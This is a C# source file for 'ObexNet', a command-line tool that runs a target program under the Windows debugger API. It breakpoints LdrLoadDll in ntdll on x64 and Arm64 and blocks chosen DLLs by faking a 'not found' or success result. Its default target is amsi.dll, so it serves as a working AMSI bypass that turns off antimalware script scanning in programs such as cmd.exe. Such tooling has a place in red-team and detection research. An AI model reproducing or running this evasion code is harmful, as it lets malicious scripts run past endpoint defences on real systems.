using System.Diagnostics.CodeAnalysis;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Text.Json;
using Win64;

[SuppressMessage("ReSharper", "UnusedMethodReturnValue.Local")]
unsafe class Program
{
    // --- Global State ---
    static List<string> _dllBlockPatterns = [];
    static HashSet<string> _blockedDllsHistory = [];
    static IntPtr _remoteNtdllBase = IntPtr.Zero;
    static IntPtr _remoteLdrAddr = IntPtr.Zero;
    static byte[] _origBytes = []; 
    static IntPtr _hProc = IntPtr.Zero;
    static uint _pendingRearmTid;
    static bool _isFirstDll = true;

    // --- Configuration Flags ---
    static bool _silentMode;
    static bool _jsonOutput;
    static bool _interactiveMode;
    static bool _fakeSuccess;
    static bool _followChildren;

    // --- Architecture State ---
    static bool _isArm64;
    static byte[] _bpBytes = [];

    static void Main(string[] args)
    {
        // 1. Detect Architecture
        var arch = RuntimeInformation.ProcessArchitecture;
        if (arch == Architecture.Arm64)
        {
            _isArm64 = true;
            // BRK #0xF000 (Windows debug breakpoint for Arm64)
            // Opcode: 0xD43E0000 (Little Endian: 00 00 3E D4)
            _bpBytes = [0x00, 0x00, 0x3E, 0xD4];
        }
        else if (arch == Architecture.X64)
        {
            _isArm64 = false;
            // INT 3
            _bpBytes = [0xCC];
        }
        else
        {
            Console.WriteLine($"[!] Unsupported Architecture: {arch}");
            return;
        }

        if (args.Length < 1)
        {
            PrintUsage();
            return;
        }

        // Parse arguments
        var cmdLineArgs = new List<string>();
        foreach (var arg in args)
        {
            if (arg.StartsWith("--"))
            {
                switch (arg.ToLower())
                {
                    case "--silent": _silentMode = true; break;
                    case "--json": _jsonOutput = true; break;
                    case "--interactive": _interactiveMode = true; break;
                    case "--fake-success": _fakeSuccess = true; break;
                    case "--follow-children": _followChildren = true; break;
                    default: Console.WriteLine($"[!] Unknown flag: {arg}"); return;
                }
            }
            else
            {
                cmdLineArgs.Add(arg);
            }
        }

        if (cmdLineArgs.Count < 1)
        {
            PrintUsage();
            return;
        }

        var targetCmd = cmdLineArgs[0];
        if (cmdLineArgs.Count >= 2)
        {
            var patterns = cmdLineArgs[1].Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
            _dllBlockPatterns.AddRange(patterns);
        }
        else
        {
            _dllBlockPatterns.Add("amsi.dll"); // Default
        }

        if (!_silentMode && !_jsonOutput)
        {
            PrintBanner();
            Console.WriteLine($"[*] Architecture: {arch}");
            Console.WriteLine($"[*] Command: '{targetCmd}'");
            Console.WriteLine($"[*] Block Patterns: '{string.Join(", ", _dllBlockPatterns)}'");
            Console.WriteLine($"[*] Options: Silent={_silentMode}, JSON={_jsonOutput}, Interactive={_interactiveMode}, FakeSuccess={_fakeSuccess}, FollowChildren={_followChildren}");
        }

        var si = new StartupInfo();
        si.cb = (uint)Marshal.SizeOf(si);

        var creationFlags = Native.DEBUG_ONLY_THIS_PROCESS;
        if (_followChildren)
        {
            creationFlags = Native.DEBUG_PROCESS; // Follow child processes
        }

        var success = Native.CreateProcess(
            null,
            targetCmd,
            IntPtr.Zero,
            IntPtr.Zero,
            false,
            creationFlags,
            IntPtr.Zero,
            null,
            ref si,
            out ProcessInformation pi);

        if (!success)
        {
            LogError($"CreateProcess failed: {Marshal.GetLastWin32Error()}");
            return;
        }

        LogInfo("Started process");
        _hProc = pi.hProcess;

        var done = false;

        while (!done)
        {
            if (!Native.WaitForDebugEvent(out DebugEvent debugEvent, Native.INFINITE))
            {
                LogError($"WaitForDebugEvent failed: {Marshal.GetLastWin32Error()}");
                break;
            }

            var continueStatus = Native.DBG_CONTINUE;

            switch (debugEvent.dwDebugEventCode)
            {
                case Native.CREATE_PROCESS_DEBUG_EVENT:
                    if (_followChildren && debugEvent.dwProcessId != pi.dwProcessId)
                    {
                        LogInfo($"Attached to child process PID: {debugEvent.dwProcessId}");
                        Native.CloseHandle(debugEvent.CreateProcessInfo.hFile);
                    }
                    else
                    {
                        Native.CloseHandle(debugEvent.CreateProcessInfo.hFile);
                    }
                    break;

                case Native.LOAD_DLL_DEBUG_EVENT:
                    HandleLoadDll(debugEvent);
                    break;

                case Native.EXCEPTION_DEBUG_EVENT:
                    var code = debugEvent.Exception.ExceptionRecord.ExceptionCode;
                    var exceptionAddr = debugEvent.Exception.ExceptionRecord.ExceptionAddress;

                    if (code == unchecked((uint)Native.EXCEPTION_BREAKPOINT))
                    {
                        if (_remoteLdrAddr != IntPtr.Zero && exceptionAddr == _remoteLdrAddr)
                        {
                            var ret = HandleLdrCall(debugEvent.dwThreadId);
                            if (ret == 2 || ret == 1)
                            {
                                continueStatus = Native.DBG_CONTINUE;
                            }
                        }
                        else
                        {
                            continueStatus = Native.DBG_EXCEPTION_NOT_HANDLED;
                        }
                        break;
                    }

                    if (code == unchecked((uint)Native.EXCEPTION_SINGLE_STEP) && _remoteLdrAddr != IntPtr.Zero)
                    {
                        RearmAfterSingleStep(debugEvent);
                        continueStatus = Native.DBG_CONTINUE;
                        break;
                    }

                    continueStatus = Native.DBG_EXCEPTION_NOT_HANDLED;
                    break;

                case Native.EXIT_PROCESS_DEBUG_EVENT:
                    if (debugEvent.dwProcessId == pi.dwProcessId)
                    {
                        LogInfo($"Child exited with code: {debugEvent.ExitProcess.dwExitCode}");
                        continueStatus = Native.DBG_CONTINUE;
                        done = true;
                    }
                    else
                    {
                        LogInfo($"Child process {debugEvent.dwProcessId} exited with code: {debugEvent.ExitProcess.dwExitCode}");
                    }
                    break;
            }

            Native.ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, continueStatus);
        }

        if (_hProc != IntPtr.Zero) Native.CloseHandle(_hProc);
        if (pi.hThread != IntPtr.Zero) Native.CloseHandle(pi.hThread);
    }

    static void HandleLoadDll(DebugEvent debugEvent)
    {
        if (_remoteNtdllBase != IntPtr.Zero) return;

        var dllName = "";

        if (debugEvent.LoadDll.hFile != IntPtr.Zero)
        {
            var sb = new StringBuilder(1024);
            var result = Native.GetFinalPathNameByHandle(debugEvent.LoadDll.hFile, sb, 1024, 0);
            if (result > 0)
            {
                dllName = Path.GetFileName(sb.ToString());
            }
            Native.CloseHandle(debugEvent.LoadDll.hFile);
        }

        var isNtdll = string.Equals(dllName, "ntdll.dll", StringComparison.OrdinalIgnoreCase);

        if (!isNtdll)
        {
            var localNtdll = Native.GetModuleHandle("ntdll.dll");
            if (localNtdll != IntPtr.Zero && debugEvent.LoadDll.lpBaseOfDll == localNtdll)
            {
                isNtdll = true;
            }
        }

        if (!isNtdll && _isFirstDll)
        {
            isNtdll = true;
        }

        _isFirstDll = false;

        if (isNtdll)
        {
            _remoteNtdllBase = debugEvent.LoadDll.lpBaseOfDll;

            var localNtdll = Native.GetModuleHandle("ntdll.dll");
            var localLdr = Native.GetProcAddress(localNtdll, "LdrLoadDll");

            if (localNtdll != IntPtr.Zero && localLdr != IntPtr.Zero)
            {
                // Only check for 0xE9 (JMP) on x64
                if (!_isArm64)
                {
                    var firstByte = *(byte*)localLdr;
                    if (firstByte == 0xE9)
                    {
                        LogWarning("Local LdrLoadDll starts with JMP (0xE9). Offset calculation may be incorrect due to local hooks!");
                    }
                }

                var offset = localLdr - (long) localNtdll;
                _remoteLdrAddr = new IntPtr(_remoteNtdllBase + offset);

                SetBreakpoint(_remoteLdrAddr, out _origBytes);
                LogInfo($"Hooked LdrLoadDll at 0x{_remoteLdrAddr:X} (ntdll at 0x{_remoteNtdllBase:X})");
            }
        }
    }

    [SuppressMessage("ReSharper", "InconsistentNaming")]
    static int HandleLdrCall(uint threadId)
    {
        var hThread = Native.OpenThread(Native.THREAD_ALL_ACCESS, false, threadId);
        if (hThread == IntPtr.Zero)
        {
            LogDebug($"Failed to OpenThread. Error: {Marshal.GetLastWin32Error()}");
            return 0;
        }

        // Determine Context Size and Alignment based on Arch
        int ctxSize = _isArm64 ? Marshal.SizeOf(typeof(ContextArm64)) : Marshal.SizeOf(typeof(Context64));
        var pRaw = Marshal.AllocHGlobal(ctxSize + 16);
        var pAligned = new IntPtr((pRaw.ToInt64() + 15) & ~15);

        try
        {
            if (_isArm64)
            {
                Marshal.WriteInt32(pAligned, 0, (int)(Native.CONTEXTARM64_CONTROL | Native.CONTEXTARM64_INTEGER));
            }
            else
            {
                Marshal.WriteInt32(pAligned, 48, (int)(Native.CONTEXT64_CONTROL | Native.CONTEXT64_INTEGER));
            }

            if (!Native.GetThreadContext(hThread, pAligned))
            {
                LogDebug($"Failed to GetThreadContext. Error: {Marshal.GetLastWin32Error()}");
                return 0;
            }

            // Restore original bytes to allow execution
            WriteCode(_remoteLdrAddr, _origBytes, _bpBytes.Length);

            // Variables to hold register values generically
            ulong ip;
            ulong arg3_DllNamePtr; 
            ulong arg4_ResultPtr;
            ulong retAddr; // Only needed for x64 stack fix, or LR on Arm64

            // --- Read Registers ---
            if (_isArm64)
            {
                var ctx = Marshal.PtrToStructure<ContextArm64>(pAligned);
                ctx.Pc = (ulong)_remoteLdrAddr; // Rewind PC
                ip = ctx.Pc;
                arg3_DllNamePtr = ctx.X2;
                arg4_ResultPtr = ctx.X3;
                
                // Write back rewound PC
                Marshal.StructureToPtr(ctx, pAligned, false);
            }
            else
            {
                var ctx = Marshal.PtrToStructure<Context64>(pAligned);
                ctx.Rip = (ulong)_remoteLdrAddr; // Rewind RIP
                ip = ctx.Rip;
                arg3_DllNamePtr = ctx.R8;
                arg4_ResultPtr = ctx.R9;
                
                // Write back rewound RIP
                Marshal.StructureToPtr(ctx, pAligned, false);
            }
            
            LogDebug($"{nameof(ip)}={ip}");

            // --- Analyze Arguments ---
            var shouldBlock = false;
            string? dllName = null;

            if (arg3_DllNamePtr != 0)
            {
                var usSize = Marshal.SizeOf(typeof(UnicodeString));
                var usBuffer = new byte[usSize];

                if (ReadRemote((IntPtr)arg3_DllNamePtr, usBuffer, usSize))
                {
                    var handle = GCHandle.Alloc(usBuffer, GCHandleType.Pinned);
                    var us = (UnicodeString)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(UnicodeString))!;
                    handle.Free();

                    if (us.Buffer != 0 && us.Length > 0)
                    {
                        var strBytes = new byte[us.Length];
                        if (ReadRemote(us.Buffer, strBytes, us.Length))
                        {
                            dllName = Encoding.Unicode.GetString(strBytes);
                            shouldBlock = ShouldBlockDll(dllName);
                        }
                    }
                }
            }

            if (!shouldBlock)
            {
                // Re-enable Single Step to re-apply breakpoint after instruction executes
                SetTfHandling(hThread, pAligned, threadId);
                return 1;
            }

            // --- BLOCKING LOGIC ---
            if (_blockedDllsHistory.Add(dllName!))
            {
                LogEvent("blocked", dllName!);
            }

            if (_interactiveMode)
            {
                Console.Write($"[?] Block loading of '{dllName}'? (Y/n): ");
                var input = Console.ReadLine();
                if (!string.IsNullOrWhiteSpace(input) && input.Trim().ToLower().StartsWith("n"))
                {
                    SetTfHandling(hThread, pAligned, threadId);
                    return 1;
                }
            }

            // --- Zero out the BaseAddress Output (Arg4) ---
            ulong zero = 0;
            if (arg4_ResultPtr != 0)
            {
                WriteRemote((IntPtr)arg4_ResultPtr, BitConverter.GetBytes(zero), 8);
            }

            // --- Modify Return Value and Flow ---
            if (_isArm64)
            {
                var ctx = Marshal.PtrToStructure<ContextArm64>(pAligned);
                // Return Value in X0
                ctx.X0 = _fakeSuccess ? 0 : 0xC0000135; // STATUS_SUCCESS or STATUS_DLL_NOT_FOUND
                
                // Return Address is in LR (X30) for ARM64
                ctx.Pc = ctx.Lr;

                Marshal.StructureToPtr(ctx, pAligned, false);
            }
            else
            {
                var ctx = Marshal.PtrToStructure<Context64>(pAligned);
                // Return Value in Rax
                ctx.Rax = _fakeSuccess ? 0 : 0xC0000135;

                // Return Address is on Stack for x64
                var retAddrBytes = new byte[8];
                if (ReadRemote((IntPtr)ctx.Rsp, retAddrBytes, 8))
                {
                    retAddr = BitConverter.ToUInt64(retAddrBytes, 0);
                    ctx.Rsp += 8; // Pop stack
                    ctx.Rip = retAddr;
                }

                Marshal.StructureToPtr(ctx, pAligned, false);
            }

            // Re-apply breakpoint immediately since we are simulating return (skipping execution)
            SetBreakpoint(_remoteLdrAddr, out _origBytes);

            if (!Native.SetThreadContext(hThread, pAligned))
            {
                LogDebug($"Failed to SetThreadContext (Block). Error: {Marshal.GetLastWin32Error()}");
            }

            return 2;
        }
        finally
        {
            Marshal.FreeHGlobal(pRaw);
            Native.CloseHandle(hThread);
        }
    }

    static void RearmAfterSingleStep(DebugEvent de)
    {
        if (_remoteLdrAddr == IntPtr.Zero || de.dwThreadId != _pendingRearmTid) return;

        var hThread = Native.OpenThread(Native.THREAD_ALL_ACCESS, false, de.dwThreadId);
        if (hThread == IntPtr.Zero) return;

        // Determine Context Size
        int ctxSize = _isArm64 ? Marshal.SizeOf(typeof(ContextArm64)) : Marshal.SizeOf(typeof(Context64));
        var pRaw = Marshal.AllocHGlobal(ctxSize + 16);
        var pAligned = new IntPtr((pRaw.ToInt64() + 15) & ~15);

        try
        {
            if (_isArm64)
            {
                Marshal.WriteInt32(pAligned, 0, (int)Native.CONTEXTARM64_CONTROL);
                if (Native.GetThreadContext(hThread, pAligned))
                {
                    var ctx = Marshal.PtrToStructure<ContextArm64>(pAligned);
                    ctx.Cpsr &= ~0x200000u; // Clear SS (Bit 21)
                    Marshal.StructureToPtr(ctx, pAligned, false);
                    Native.SetThreadContext(hThread, pAligned);
                }
            }
            else
            {
                Marshal.WriteInt32(pAligned, 48, (int)Native.CONTEXT64_CONTROL);
                if (Native.GetThreadContext(hThread, pAligned))
                {
                    var ctx = Marshal.PtrToStructure<Context64>(pAligned);
                    ctx.EFlags &= ~0x100u; // Clear TF
                    Marshal.StructureToPtr(ctx, pAligned, false);
                    Native.SetThreadContext(hThread, pAligned);
                }
            }
        }
        finally
        {
            Marshal.FreeHGlobal(pRaw);
            Native.CloseHandle(hThread);
        }

        SetBreakpoint(_remoteLdrAddr, out _origBytes);
        _pendingRearmTid = 0;
    }

    static void SetTfHandling(IntPtr hThread, IntPtr pAlignedContext, uint threadId)
    {
        if (_isArm64)
        {
            var ctx = Marshal.PtrToStructure<ContextArm64>(pAlignedContext);
            ctx.Cpsr |= 0x200000u; // Set SS (Bit 21)
            Marshal.StructureToPtr(ctx, pAlignedContext, false);
        }
        else
        {
            var ctx = Marshal.PtrToStructure<Context64>(pAlignedContext);
            ctx.EFlags |= 0x100; // Set TF
            Marshal.StructureToPtr(ctx, pAlignedContext, false);
        }

        Native.SetThreadContext(hThread, pAlignedContext);
        _pendingRearmTid = threadId;
    }

    static bool ShouldBlockDll(string? dllPath)
    {
        if (string.IsNullOrEmpty(dllPath)) return false;
        var fname = Path.GetFileName(dllPath);

        foreach (var pattern in _dllBlockPatterns)
        {
            if (pattern.Contains("*") || pattern.Contains("?"))
            {
                var regexPattern = "^" + Regex.Escape(pattern).Replace("\\*", ".*").Replace("\\?", ".") + "$";
                if (Regex.IsMatch(fname, regexPattern, RegexOptions.IgnoreCase)) return true;
            }
            else if (string.Equals(fname, pattern, StringComparison.OrdinalIgnoreCase))
            {
                return true;
            }
        }
        return false;
    }

    static bool SetBreakpoint(IntPtr addr, out byte[] savedBytes)
    {
        savedBytes = new byte[_bpBytes.Length];
        if (!ReadRemote(addr, savedBytes, _bpBytes.Length)) return false;
        
        var ok = WriteCode(addr, _bpBytes, _bpBytes.Length);
        return ok;
    }

    static bool ReadRemote(IntPtr addr, byte[] buffer, int size)
    {
        int bytesRead;
        return Native.ReadProcessMemory(_hProc, addr, buffer, size, out bytesRead) && bytesRead == size;
    }

    static bool WriteRemote(IntPtr addr, byte[] buffer, int size)
    {
        int bytesWritten;
        var res = Native.WriteProcessMemory(_hProc, addr, buffer, size, out bytesWritten) && bytesWritten == size;
        if (res) Native.FlushInstructionCache(_hProc, addr, (uint)size);
        return res;
    }

    static bool WriteCode(IntPtr addr, byte[] buffer, int size)
    {
        uint oldProt;
        if (!Native.VirtualProtectEx(_hProc, addr, (uint)size, Native.PAGE_READWRITE, out oldProt)) return false;
        var ok = WriteRemote(addr, buffer, size);
        Native.VirtualProtectEx(_hProc, addr, (uint)size, oldProt, out _);
        return ok;
    }

    // --- Logging Helpers ---

    static void PrintBanner()
    {
        Console.WriteLine(@"
   ____  _              _   _      _   
  / __ \| |            | \ | |    | |  
 | |  | | |__   ___  __|  \| | ___| |_ 
 | |  | | '_ \ / _ \/ _` . ` |/ _ \ __|
 | |__| | |_) |  __/ (_| |\  |  __/ |_ 
  \____/|_.__/ \___|\__,_| \_|\___|\__|
                                       ");
    }

    static void PrintUsage()
    {
        Console.WriteLine("Usage: ObexNet.exe \"<command>\" [patterns] [options]");
        Console.WriteLine("Options:");
        Console.WriteLine("  --silent          Suppress banner and non-essential logs");
        Console.WriteLine("  --json            Output logs in JSON format");
        Console.WriteLine("  --interactive     Ask before blocking");
        Console.WriteLine("  --fake-success    Return Success instead of Not Found (experimental)");
        Console.WriteLine("  --follow-children Follow child processes (experimental)");
        Console.WriteLine("\nExample: ObexNet.exe \"cmd.exe\" \"amsi.dll,api-ms-win-*\" --json");
    }

    static void LogInfo(string message)
    {
        if (_silentMode || _jsonOutput) return;
        Console.WriteLine($"[+] {message}");
    }

    static void LogWarning(string message)
    {
        if (_jsonOutput) return;
        Console.WriteLine($"[!] {message}");
    }

    [SuppressMessage("ReSharper", "RedundantAnonymousTypePropertyName")]
    static void LogError(string message)
    {
        if (_jsonOutput)
        {
            var json = JsonSerializer.Serialize(
                new
                {
                    type = "error",
                    message = message 
                });
            Console.WriteLine(json);
        }
        else
        {
            Console.WriteLine($"[-] ERROR: {message}");
        }
    }

    [SuppressMessage("ReSharper", "UnusedParameter.Local")]
    static void LogDebug(string message)
    {
        if (_silentMode || _jsonOutput) return;
        
#if DEBUG
        Console.WriteLine($"[Debug] {message}");
#endif
    }

    [SuppressMessage("ReSharper", "RedundantAnonymousTypePropertyName")]
    static void LogEvent(string type, string target)
    {
        if (_jsonOutput)
        {
            var json = JsonSerializer.Serialize(
                new 
                { 
                    timestamp = DateTime.UtcNow,
                    type = type, 
                    target = target,
                    action = _fakeSuccess ? "fake_success" : "block"
                }
            );
            Console.WriteLine(json);
        }
        else
        {
            Console.WriteLine($"[+] Blocked loading of '{target}'");
        }
    }
}